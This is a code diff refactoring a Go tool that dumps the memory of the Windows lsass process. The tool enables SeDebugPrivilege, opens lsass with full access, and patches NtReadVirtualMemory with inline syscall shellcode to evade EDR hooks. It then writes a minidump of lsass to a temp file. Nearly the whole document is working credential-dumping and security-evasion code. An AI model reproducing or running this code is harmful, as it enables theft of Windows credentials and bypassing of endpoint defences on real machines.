@@ -22,58 +22,34 @@ func minidump(pid, proc int) {
 
 	k32 := syscall.NewLazyDLL("Dbgcore.dll")
 	m := k32.NewProc("MiniDumpWriteDump")
-
 	f, e := ioutil.TempFile("./", "")
 	if e != nil {
 		panic(e)
 	}
 	stdOutHandle := f.Fd()
-
 	r, _, _ := m.Call(ptr(proc), ptr(pid), stdOutHandle, 3, 0, 0, 0)
 	if r != 0 {
 		fmt.Println("Successfully dumped lsass, wrote dump to ", f.Name())
 	}
 }
 
-const (
-	ERROR_NO_MORE_FILES = 0x12
-	MAX_PATH            = 260
-)
-
-type PROCESSENTRY32 struct {
-	Size              uint32
-	CntUsage          uint32
-	ProcessID         uint32
-	DefaultHeapID     uintptr
-	ModuleID          uint32
-	CntThreads        uint32
-	ParentProcessID   uint32
-	PriorityClassBase int32
-	Flags             uint32
-	ExeFile           [MAX_PATH]uint16
-}
-
-func getProcID(procname string) int {
+func getProcID(procname string) uint32 {
 	//https://github.com/mitchellh/go-ps/blob/master/process_windows.go
-	modKernel32 := syscall.NewLazyDLL("kernel32.dll")
-	procCreateToolhelp32Snapshot := modKernel32.NewProc("CreateToolhelp32Snapshot")
-	procCloseHandle := modKernel32.NewProc("CloseHandle")
-	procProcess32First := modKernel32.NewProc("Process32FirstW")
-	procProcess32Next := modKernel32.NewProc("Process32NextW")
-	handle, _, _ := procCreateToolhelp32Snapshot.Call(
+
+	handle, err := syscall.CreateToolhelp32Snapshot(
 		0x00000002,
 		0)
 	if handle < 0 {
 		fmt.Println("handle 0 or lower?")
 		return 0
 	}
-	defer procCloseHandle.Call(handle)
+	defer syscall.CloseHandle(handle)
 
-	var entry PROCESSENTRY32
+	var entry syscall.ProcessEntry32
 	entry.Size = uint32(unsafe.Sizeof(entry))
-	ret, _, _ := procProcess32First.Call(handle, uintptr(unsafe.Pointer(&entry)))
-	if ret == 0 {
-		fmt.Println(fmt.Errorf("error retrieving process info"))
+	err = syscall.Process32First(handle, &entry)
+	if err != nil {
+		fmt.Println(err)
 		return 0
 	}
 
@@ -85,11 +61,10 @@ func getProcID(procname string) int {
 			}
 		}
 		if s == procname {
-			return int(entry.ProcessID)
+			return entry.ProcessID
 		}
-
-		ret, _, _ := procProcess32Next.Call(handle, uintptr(unsafe.Pointer(&entry)))
-		if ret == 0 {
+		err = syscall.Process32Next(handle, &entry)
+		if err != nil {
 			break
 		}
 	}
@@ -111,41 +86,37 @@ func setPrivilege(s string, b bool) bool {
 		Privileges     [1]LUID_AND_ATTRIBUTES
 	}
 
-	TOKEN_ADJUST_PRIVILEGES := uintptr(0x0020)
 	modadvapi32 := syscall.NewLazyDLL("advapi32.dll")
-	kernel32 := syscall.NewLazyDLL("kernel32.dll")
+	//kernel32 := syscall.NewLazyDLL("kernel32.dll")
 	procAdjustTokenPrivileges := modadvapi32.NewProc("AdjustTokenPrivileges")
 
-	procOpenProcessToken := modadvapi32.NewProc("OpenProcessToken")
 	procLookupPriv := modadvapi32.NewProc("LookupPrivilegeValueW")
-
-	var tokenHandle uintptr
-	thsHandle, _, _ := kernel32.NewProc("GetCurrentProcess").Call()
-	r, a, e := procOpenProcessToken.Call(
-		thsHandle,                             //  HANDLE  ProcessHandle,
-		TOKEN_ADJUST_PRIVILEGES,               //	DWORD   DesiredAccess,
-		uintptr(unsafe.Pointer(&tokenHandle)), //	PHANDLE TokenHandle
+	var tokenHandle syscall.Token
+	thsHandle, err := syscall.GetCurrentProcess()
+	if err != nil {
+		panic(err)
+	}
+	syscall.OpenProcessToken(
+		//r, a, e := procOpenProcessToken.Call(
+		thsHandle,                       //  HANDLE  ProcessHandle,
+		syscall.TOKEN_ADJUST_PRIVILEGES, //	DWORD   DesiredAccess,
+		&tokenHandle,                    //	PHANDLE TokenHandle
 	)
-	fmt.Println("openproctok:", r, a, e)
-
 	var luid LUID
-
-	r, a, e = procLookupPriv.Call(
+	r, a, e := procLookupPriv.Call(
 		ptr(0),                         //LPCWSTR lpSystemName,
 		ptr(s),                         //LPCWSTR lpName,
 		uintptr(unsafe.Pointer(&luid)), //PLUID   lpLuid
 	)
 	fmt.Println("lookuppriv:", r, a, e)
-
 	SE_PRIVILEGE_ENABLED := uint32(0x00000002)
 	privs := TOKEN_PRIVILEGES{}
 	privs.PrivilegeCount = 1
 	privs.Privileges[0].Luid = luid
 	privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
-
 	//AdjustTokenPrivileges(hToken, false, &priv, 0, 0, 0)
 	r, a, e = procAdjustTokenPrivileges.Call(
-		tokenHandle,
+		uintptr(tokenHandle),
 		uintptr(0),
 		uintptr(unsafe.Pointer(&privs)),
 		ptr(0),
@@ -156,20 +127,18 @@ func setPrivilege(s string, b bool) bool {
 	return false
 }
 
-const (
-	win8  = 0x060200
-	win81 = 0x060300
-	win10 = 0x0A0000
-)
-
 func getNTReadVirtualSyscall() byte {
+	const (
+		win8  = 0x060200
+		win81 = 0x060300
+		win10 = 0x0A0000
+	)
 	//                    7 and Pre-7     2012SP0   2012-R2    8.0     8.1    Windows 10+
 	//NtReadVirtualMemory 0x003c 0x003c    0x003d   0x003e    0x003d 0x003e 0x003f 0x003f
 
 	syscall_id := byte(0x3f)
 	//static auto RtlGetVersion = (RtlGetVersion_t)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlGetVersion");
 	procRtlGetVersion := syscall.NewLazyDLL("ntdll.dll").NewProc("RtlGetVersion")
-
 	type osVersionInfoExW struct {
 		dwOSVersionInfoSize uint32
 		dwMajorVersion      uint32
@@ -194,46 +163,37 @@ func getNTReadVirtualSyscall() byte {
 	//RtlGetVersion((POSVERSIONINFOW)&osvi);
 
 	version_long := (osvi.dwMajorVersion << 16) | (osvi.dwMinorVersion << 8) | uint32(osvi.wServicePackMajor)
-
 	if version_long < win8 { //before win8
 		syscall_id = 0x3c
 	} else if version_long == win8 { //win8 and server 2008 sp0
-
 		syscall_id = 0x3d
 	} else if version_long == win81 { //win 8.1 and server 2008 r2
-
 		syscall_id = 0x3e
 	} else if version_long > win81 { //anything after win8.1
 		syscall_id = 0x3f
 	}
-
 	return syscall_id
 }
 
 func freeNtReadVirtualMemory() {
 	sysval := getNTReadVirtualSyscall()
-
-	//win64 original values
+	//win64 original values, (todo: add 32bit, and use when in 32bit land)
 	shellcode := []byte{
 		0x4C, 0x8B, 0xD1, // mov r10, rcx; NtReadVirtualMemory
 		0xB8, 0x3c, 0x00, 0x00, 0x00, // eax, 3ch
 		0x0F, 0x05, // syscall
 		0xC3, // retn
 	}
-
 	shellcode[4] = sysval
 	kernel32 := syscall.NewLazyDLL("kernel32.dll")
 	procWriteMem := kernel32.NewProc("WriteProcessMemory")
-
 	ntdll := syscall.NewLazyDLL("ntdll.dll")
 	rvm := ntdll.NewProc("NtReadVirtualMemory")
 	NtReadVirtualMemory := rvm.Addr()
-
-	thsHandle, _, _ := kernel32.NewProc("GetCurrentProcess").Call()
-
+	thsHandle, _ := syscall.GetCurrentProcess()
 	//WriteProcessMemory(GetCurrentProcess(), NtReadVirtualMemory, Shellcode, sizeof(Shellcode), NULL);
 	r, a, e := procWriteMem.Call(
-		thsHandle,                              // this pid (HANDLE hprocess)
+		uintptr(thsHandle),                     // this pid (HANDLE hprocess)
 		NtReadVirtualMemory,                    // address of target? (LPVOID lpBaseAddress)
 		uintptr(unsafe.Pointer(&shellcode[0])), // LPCVOID lpBuffer,
 		uintptr(len(shellcode)),                // SIZE_T nSize,
@@ -246,8 +206,6 @@ func freeNtReadVirtualMemory() {
 	}
 }
 
-type Process uintptr
-
 func ptr(val interface{}) uintptr {
 	switch val.(type) {
 	case string:
@@ -259,17 +217,6 @@ func ptr(val interface{}) uintptr {
 	}
 }
 
-func OpenProcessHandle(processId int) Process {
-	PROCESS_ALL_ACCESS := 0x1F0FFF
-	kernel32 := syscall.MustLoadDLL("kernel32.dll")
-	proc := kernel32.MustFindProc("OpenProcess")
-	handle, a2, e := proc.Call(ptr(PROCESS_ALL_ACCESS), uintptr(0), ptr(processId))
-	if handle == 0 {
-		fmt.Println("Couldn't get handle:", processId, handle, a2, e)
-	}
-	return Process(handle)
-}
-
 //greetz to hoang and his andrewspecial post :)
 //https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6
 func main() {
@@ -277,7 +224,10 @@ func main() {
 	setPrivilege("SeDebugPrivilege", true)
 	pid := getProcID(pn)
 	fmt.Println("lsass pid:", pid)
-	hProc := OpenProcessHandle(int(pid))
+	hProc, err := syscall.OpenProcess(0x1F0FFF, false, pid) //PROCESS_ALL_ACCESS := uint32(0x1F0FFF)
+	if err != nil {
+		panic(err)
+	}
 	fmt.Println("proc handle:", hProc)
 	if hProc != 0 {
 		freeNtReadVirtualMemory()
